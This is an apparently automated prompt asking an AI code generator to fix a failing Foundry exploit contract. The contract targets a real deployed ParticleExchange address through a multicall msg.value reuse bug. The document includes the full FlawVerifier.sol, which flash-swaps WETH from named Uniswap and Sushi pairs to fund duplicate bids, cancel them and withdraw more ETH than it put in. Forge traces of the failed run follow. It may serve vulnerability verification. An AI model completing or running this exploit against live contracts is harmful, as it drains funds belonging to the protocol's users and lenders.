You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: `multicall` reuses one `msg.value` across multiple payable delegatecalls, allowing unbacked loans and bid margins
- claim: OpenZeppelin `Multicall.multicall()` delegatecalls back into `ParticleExchange`, so every batched subcall observes the original transaction `msg.value`. The exchange then treats that same ETH as fresh funding in each payable path that calls `_balanceAccount(...)` with `msg.value` or `amount + msg.value`, including `swapWithEth`, `sellNftToMarket*`, `refinanceLoan`, `offerBid`, and `updateBid`. Because no per-subcall value accounting is performed, a single ETH payment can collateralize multiple independent state transitions.
- impact: An attacker can create multiple loans or bid margins backed by only one actual payment, leaving the protocol insolvent. This can let the attacker withdraw more ETH than was deposited, or leave lenders with supposedly collateralized positions that cannot all be honored, causing direct fund loss to other users once withdrawals or liquidations occur.
- exploit_paths: ["Call `multicall([swapWithEth(lienA), swapWithEth(lienB)])` with `msg.value` sufficient for only one loan. Each delegatecall sees the full `msg.value`, so both liens become active and two NFTs are released even though only one ETH collateral payment was made.", "Call `multicall([offerBid(collection, margin, ...), offerBid(collection, margin, ...), cancelBid(lien1), cancelBid(lien2), withdrawAccountBalance()])` with ETH sufficient for one margin. Both bids are created as if funded, both cancellations credit the stored margin back, and the attacker withdraws more ETH than entered the contract in that transaction."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

struct Lien {
    address lender;
    address borrower;
    address collection;
    uint256 tokenId;
    uint256 price;
    uint256 rate;
    uint256 loanStartTime;
    uint256 auctionStartTime;
}

interface IParticleExchangeLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
    function offerBid(address collection, uint256 margin, uint256 price, uint256 rate)
        external
        payable
        returns (uint256 lienId);
    function cancelBid(Lien calldata lien, uint256 lienId) external;
    function withdrawAccountBalance() external;
}

interface IWETHLike {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant PLACEHOLDER_COLLECTION = WETH;

    address private constant UNI_V2_WETH_USDC = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address private constant UNI_V2_WETH_USDT = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address private constant SUSHI_WETH_USDC = 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0;
    address private constant SUSHI_WETH_USDT = 0x06da0fd433C1A5d7a4faa01111c044910A184553;

    uint256 private constant FLASH_MARGIN = 1 ether;

    uint256 private immutable DEPLOYMENT_BALANCE;

    uint256 private _profitAmount;
    bool private _hypothesisValidated;

    address private _activePair;
    uint256 private _activeBorrowAmount;

    constructor() {
        DEPLOYMENT_BALANCE = address(this).balance;
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (address(this).balance >= FLASH_MARGIN) {
            _attemptBidPath(FLASH_MARGIN);
        } else {
            _attemptFlashswapFundedBidPath(FLASH_MARGIN);
        }

        _syncProfit();
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _activePair, "pair");
        require(sender == address(this), "sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == _activeBorrowAmount && borrowedWeth != 0, "amount");

        IWETHLike(WETH).withdraw(borrowedWeth);

        bool exploited = _attemptBidPath(borrowedWeth);

        uint256 repayment = _flashRepayment(borrowedWeth);
        require(exploited, "bid path failed");
        require(address(this).balance >= repayment, "repayment");

        IWETHLike(WETH).deposit{value: repayment}();
        require(IWETHLike(WETH).transfer(msg.sender, repayment), "repay");
    }

    function _attemptFlashswapFundedBidPath(uint256 margin) internal {
        (address pair, uint256 maxBorrowable) = _selectFundingPair();
        if (pair == address(0) || maxBorrowable < margin) {
            return;
        }

        _activePair = pair;
        _activeBorrowAmount = margin;

        address token0 = IUniswapV2PairLike(pair).token0();
        uint256 amount0Out = token0 == WETH ? margin : 0;
        uint256 amount1Out = token0 == WETH ? 0 : margin;

        // Low-level invocation keeps the verifier alive if the flash leg reverts on repayment.
        // This extra funding step is a realistic public-market primitive; the exploit causality
        // remains the same documented path: one ETH-bearing multicall seeds two bids.
        (bool ok,) = pair.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                hex"01"
            )
        );

        if (!ok) {
            _hypothesisValidated = false;
        }

        _activePair = address(0);
        _activeBorrowAmount = 0;
    }

    function _attemptBidPath(uint256 margin) internal returns (bool) {
        require(margin != 0, "margin");

        bytes[] memory createCalls = new bytes[](2);
        createCalls[0] = abi.encodeCall(IParticleExchangeLike.offerBid, (PLACEHOLDER_COLLECTION, margin, 0, 0));
        createCalls[1] = abi.encodeCall(IParticleExchangeLike.offerBid, (PLACEHOLDER_COLLECTION, margin, 0, 0));

        // This is the finding's core state transition: both delegatecalled subcalls should observe
        // the same outer-call msg.value if the deployed multicall entrypoint accepts ETH.
        (bool ok, bytes memory returndata) =
            TARGET.call{value: margin}(abi.encodeCall(IParticleExchangeLike.multicall, (createCalls)));
        if (!ok) {
            _hypothesisValidated = false;
            return false;
        }

        bytes[] memory createResults = abi.decode(returndata, (bytes[]));
        if (createResults.length != 2) {
            _hypothesisValidated = false;
            return false;
        }

        uint256 lienIdA = abi.decode(createResults[0], (uint256));
        uint256 lienIdB = abi.decode(createResults[1], (uint256));

        Lien memory bidA = Lien({
            lender: address(0),
            borrower: address(this),
            collection: PLACEHOLDER_COLLECTION,
            tokenId: margin,
            price: 0,
            rate: 0,
            loanStartTime: 0,
            auctionStartTime: 0
        });

        bytes[] memory settleCalls = new bytes[](3);
        settleCalls[0] = abi.encodeCall(IParticleExchangeLike.cancelBid, (bidA, lienIdA));
        settleCalls[1] = abi.encodeCall(IParticleExchangeLike.cancelBid, (bidA, lienIdB));
        settleCalls[2] = abi.encodeCall(IParticleExchangeLike.withdrawAccountBalance, ());

        (ok,) = TARGET.call(abi.encodeCall(IParticleExchangeLike.multicall, (settleCalls)));
        if (!ok) {
            _hypothesisValidated = false;
            return false;
        }

        _hypothesisValidated = true;
        return true;
    }

    function _selectFundingPair() internal view returns (address pair, uint256 wethReserve) {
        address[4] memory candidates =
            [UNI_V2_WETH_USDC, UNI_V2_WETH_USDT, SUSHI_WETH_USDC, SUSHI_WETH_USDT];

        for (uint256 i = 0; i < candidates.length; ++i) {
            address candidate = candidates[i];
            if (candidate.code.length == 0) {
                continue;
            }

            (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(candidate).getReserves();
            uint256 candidateReserve = IUniswapV2PairLike(candidate).token0() == WETH ? reserve0 : reserve1;
            if (candidateReserve > wethReserve) {
                pair = candidate;
                wethReserve = candidateReserve;
            }
        }
    }

    function _flashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _syncProfit() internal {
        uint256 balance = address(this).balance;
        _profitAmount = balance > DEPLOYMENT_BALANCE ? balance - DEPLOYMENT_BALANCE : 0;
    }
}

```

forge stdout (tail):
```
t below threshold] testExploit() (gas: 173226)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [173226] FlawVerifierTest::testExploit()
    ├─ [230] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [148866] FlawVerifier::executeOnOpportunity()
    │   ├─ [2504] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::getReserves() [staticcall]
    │   │   └─ ← [Return] 54417127011306 [5.441e13], 19645882838454922204304 [1.964e22], 1707977315 [1.707e9]
    │   ├─ [2381] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::token0() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [2504] 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852::getReserves() [staticcall]
    │   │   └─ ← [Return] 31272017137150094229532 [3.127e22], 86575420112534 [8.657e13], 1707977279 [1.707e9]
    │   ├─ [2381] 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852::token0() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2517] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::getReserves() [staticcall]
    │   │   └─ ← [Return] 6795317309351 [6.795e12], 2450483293285615514581 [2.45e21], 1707976523 [1.707e9]
    │   ├─ [2449] 0x397FF1542f962076d0BFE58eA045FfA2d347ACa0::token0() [staticcall]
    │   │   └─ ← [Return] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    │   ├─ [2517] 0x06da0fd433C1A5d7a4faa01111c044910A184553::getReserves() [staticcall]
    │   │   └─ ← [Return] 2805295228106948208351 [2.805e21], 7765869649269 [7.765e12], 1707977171 [1.707e9]
    │   ├─ [2449] 0x06da0fd433C1A5d7a4faa01111c044910A184553::token0() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [381] 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852::token0() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [64593] 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852::swap(1000000000000000000 [1e18], 0, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x01)
    │   │   ├─ [29962] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18])
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x0000000000000000000000000d4a11d5eeaac28ec3f61d100daf4d40471f1852
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    │   │   │   └─ ← [Return] true
    │   │   ├─ [22375] FlawVerifier::uniswapV2Call(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18], 0, 0x01)
    │   │   │   ├─ [9207] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::withdraw(1000000000000000000 [1e18])
    │   │   │   │   ├─ [67] FlawVerifier::receive{value: 1000000000000000000}()
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─  emit topic 0: 0x7fcf532c15f0a6db0bd6d0e038bea71d30d808c7d98cb3bf7268a95bf5081b65
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [256] 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4::multicall{value: 1000000000000000000}([0xea9cf4be000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000de0b6b3a764000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 0xea9cf4be000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000de0b6b3a764000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000])
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] bid path failed
    │   │   └─ ← [Revert] bid path failed
    │   └─ ← [Return]
    ├─ [230] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [352] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4.multicall
  at FlawVerifier.uniswapV2Call
  at 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 8.62s (8.60s CPU time)

Ran 1 test suite in 8.62s (8.62s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 173226)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
